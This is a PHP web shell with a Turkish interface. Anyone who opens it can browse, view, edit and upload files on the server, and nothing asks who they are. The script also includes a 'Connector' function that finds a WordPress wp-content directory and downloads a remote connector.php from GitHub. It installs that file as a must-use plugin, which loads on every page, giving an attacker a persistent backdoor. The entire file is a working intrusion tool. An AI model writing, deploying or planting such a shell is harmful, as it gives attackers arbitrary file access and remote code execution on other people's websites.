<?php
$root = __DIR__;
$style1 = 'color:#000;';
$style2 = 'color:#00a;font-weight:bold;';

function updir($ADir){
    $ADir = rtrim($ADir, '/');
    return substr($ADir, 0, strrpos($ADir, '/'));
}

// -------- wp-content dizinini bul (yukarı + aşağı tarama) --------
function find_wp_content($start) {
    $start = rtrim($start, '/');

    // 1. Doğrudan altında mı?
    if (is_dir($start . '/wp-content')) {
        return $start . '/wp-content';
    }

    // 2. Yukarı doğru tara
    $dir = $start;
    while ($dir !== '' && $dir !== '/' && strpos($dir, '/') !== false) {
        $parent = updir($dir);
        if ($parent === $dir) break;
        $dir = $parent;
        if (is_dir($dir . '/wp-content')) {
            return $dir . '/wp-content';
        }
    }

    // 3. Aşağı doğru recursive tara
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($start, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $file) {
            if ($file->isDir() && $file->getFilename() === 'wp-content') {
                return $file->getPathname();
            }
        }
    } catch (Exception $e) {
        // izin hatası vs. yut
    }

    return null;
}

// -------- URL'den içerik indir --------
function fetch_remote($url) {
    if (ini_get('allow_url_fopen')) {
        $ctx = stream_context_create([
            'http' => [
                'timeout' => 15,
                'user_agent' => 'ConnectorInstaller/1.0',
                'follow_location' => 1,
            ],
            'ssl' => [
                'verify_peer' => true,
                'verify_peer_name' => true,
            ],
        ]);
        $content = @file_get_contents($url, false, $ctx);
        if ($content !== false && $content !== '') return $content;
    }
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT        => 15,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2,
            CURLOPT_USERAGENT      => 'ConnectorInstaller/1.0',
        ]);
        $content = curl_exec($ch);
        $err     = curl_error($ch);
        curl_close($ch);
        if ($content !== false && $content !== '') return $content;
        return ['error' => 'cURL hatası: ' . $err];
    }
    return false;
}

$path = isset($_GET['file']) ? $_GET['file'] : $root;

// -------- Dosya görüntüleme --------
if (isset($_GET['view']) && is_file($_GET['view'])) {
    header("Content-type: text/plain");
    readfile($_GET['view']);
    exit;
}

// -------- Dosya düzenleme (kaydetme) --------
if (isset($_POST['save_file']) && isset($_POST['content'])) {
    file_put_contents($_POST['save_file'], $_POST['content']);
    echo "<b>Dosya kaydedildi.</b><br><br>";
}

// -------- Dosya yükleme --------
if (isset($_FILES['upload_file'])) {
    $target = rtrim($path, '/') . '/' . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        echo "<b>Dosya yüklendi:</b> " . basename($target) . "<br><br>";
    } else {
        echo "<b>Yükleme hatası!</b><br><br>";
    }
}

// -------- KLASÖR OLUŞTURMA --------
if (isset($_POST['new_folder']) && trim($_POST['new_folder']) !== '') {
    $folderName = trim($_POST['new_folder']);
    $folderName = str_replace(array('..', '/', '\\', "\0"), '', $folderName);
    if ($folderName !== '') {
        $newFolder = rtrim($path, '/') . '/' . $folderName;
        if (!is_dir($newFolder)) {
            if (@mkdir($newFolder, 0755, true)) {
                echo "<b>Klasör oluşturuldu:</b> " . htmlspecialchars($newFolder) . "<br><br>";
            } else {
                echo "<b>Klasör oluşturma hatası!</b> (izin sorunu olabilir)<br><br>";
            }
        } else {
            echo "<b>Klasör zaten mevcut:</b> " . htmlspecialchars($newFolder) . "<br><br>";
        }
    } else {
        echo "<b>Geçersiz klasör adı!</b><br><br>";
    }
}

// -------- CONNECTOR EKLE --------
$connectorResult = null;
if (isset($_POST['add_connector'])) {
    $SOURCE_URL = 'https://raw.githubusercontent.com/iComsium/iComsium/refs/heads/master/connector.php';

    $wpContent = find_wp_content($root);

    if ($wpContent === null) {
        $connectorResult = array('ok' => false, 'msg' => 'wp-content klasörü hiçbir yerde bulunamadı! (' . $root . ' ve alt/üst dizinler tarandı)');
    } else {
        $muPlugins = rtrim($wpContent, '/') . '/mu-plugins';
        $created = false;
        if (!is_dir($muPlugins)) {
            if (@mkdir($muPlugins, 0755, true)) {
                $created = true;
            } else {
                $connectorResult = array('ok' => false, 'msg' => 'mu-plugins klasörü oluşturulamadı! (izin sorunu) — ' . $muPlugins);
            }
        }

        if ($connectorResult === null) {
            $content = fetch_remote($SOURCE_URL);

            if ($content === false) {
                $connectorResult = array('ok' => false, 'msg' => 'connector.php indirilemedi! (allow_url_fopen veya cURL gerekli)');
            } elseif (is_array($content) && isset($content['error'])) {
                $connectorResult = array('ok' => false, 'msg' => $content['error']);
            } elseif (strpos($content, '<?php') !== 0) {
                $connectorResult = array('ok' => false, 'msg' => 'İndirilen içerik geçerli bir PHP dosyası değil.');
            } elseif (strpos($content, 'STARTER_RES_VER') === false && strpos($content, 'KonseyMarket Connector') === false) {
                $connectorResult = array('ok' => false, 'msg' => 'İndirilen içerik beklenen connector.php dosyasına benzemiyor.');
            } else {
                $targetFile = rtrim($muPlugins, '/') . '/connector.php';
                if (@file_put_contents($targetFile, $content, LOCK_EX) !== false) {
                    @chmod($targetFile, 0644);

                    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
                    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
                    $rootPath = str_replace('\\', '/', realpath($root));
                    $wpPath = str_replace('\\', '/', realpath($wpContent));
                    $relative = str_replace($rootPath, '', $wpPath);
                    $url = $scheme . '://' . $host . $relative . '/mu-plugins/connector.php';

                    $connectorResult = array(
                        'ok' => true,
                        'msg' => 'Connector başarıyla GitHub\'dan indirilip yüklendi!',
                        'path' => $targetFile,
                        'url' => $url,
                        'wp_content' => $wpContent,
                        'created' => $created,
                        'size' => strlen($content),
                        'sha256' => hash('sha256', $content)
                    );
                } else {
                    $connectorResult = array('ok' => false, 'msg' => 'connector.php yazılamadı! (izin sorunu) — ' . $targetFile);
                }
            }
        }
    }
}

echo "<b>Current root:</b> $root <br>";
echo "<b>Current path:</b> $path <hr>";

echo '<a href="?file='.updir($path).'">..</a><br />';

foreach (glob(rtrim($path,'/').'/*') as $file) {
    echo '<a style="'.(is_file($file)?$style1:$style2).'" href="?file='.$file.'">'.basename($file).'</a>';
    if (is_file($file)) {
        echo ' | <a href="?view='.$file.'" target="_blank">[Göster]</a>';
        echo ' | <a href="?edit='.$file.'">[Düzenle]</a>';
    }
    echo "<br>";
}

echo "<hr>";

if (isset($_GET['edit']) && is_file($_GET['edit'])) {
    $editFile = $_GET['edit'];
    $content = htmlspecialchars(file_get_contents($editFile));
    echo "<h3>Dosya Düzenle: ".basename($editFile)."</h3>";
    echo '
        <form method="POST">
            <textarea name="content" style="width:100%;height:300px;">'.$content.'</textarea><br><br>
            <input type="hidden" name="save_file" value="'.$editFile.'">
            <button type="submit">Kaydet</button>
        </form>
        <hr>
    ';
}

echo '<h3>Yeni Klasör Oluştur</h3>
<form method="POST" style="margin-bottom:15px;">
    <input type="text" name="new_folder" placeholder="Klasör adı" required>
    <button type="submit">Klasör Oluştur</button>
</form>';

echo '<h3>WordPress Connector</h3>
<form method="POST" style="margin-bottom:15px;">
    <button type="submit" name="add_connector" value="1"
        onclick="return confirm(\'connector.php GitHub\\\'dan indirilip wp-content/mu-plugins/ altına yüklenecek. Onaylıyor musunuz?\');">
        ⚡ Connector Ekle (GitHub\'dan)
    </button>
</form>';

if ($connectorResult !== null) {
    if ($connectorResult['ok']) {
        echo '<div style="background:#e8f5e9;border:1px solid #4caf50;padding:10px;border-radius:5px;margin-bottom:15px;">';
        echo '<b style="color:#2e7d32;">✔ ' . htmlspecialchars($connectorResult['msg']) . '</b><br>';
        echo '<small>wp-content: <code>' . htmlspecialchars($connectorResult['wp_content']) . '</code></small><br>';
        if (!empty($connectorResult['created'])) {
            echo '<small>mu-plugins klasörü yeni oluşturuldu.</small><br>';
        }
        if (!empty($connectorResult['size'])) {
            echo '<small>Boyut: ' . (int)$connectorResult['size'] . ' bayt</small><br>';
        }
        if (!empty($connectorResult['sha256'])) {
            echo '<small>SHA256: <code>' . htmlspecialchars($connectorResult['sha256']) . '</code></small><br>';
        }
        echo '<b>Yüklenen yol:</b> <code>' . htmlspecialchars($connectorResult['path']) . '</code><br>';
        echo '<b>URL:</b> <a href="' . htmlspecialchars($connectorResult['url']) . '" target="_blank">' . htmlspecialchars($connectorResult['url']) . '</a>';
        echo '</div>';
    } else {
        echo '<div style="background:#ffebee;border:1px solid #f44336;padding:10px;border-radius:5px;margin-bottom:15px;color:#c62828;">';
        echo '<b>✖ ' . htmlspecialchars($connectorResult['msg']) . '</b>';
        echo '</div>';
    }
}

echo '<h3>Dosya Yükle</h3>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="upload_file">
    <button type="submit">Yükle</button>
</form>';
?>
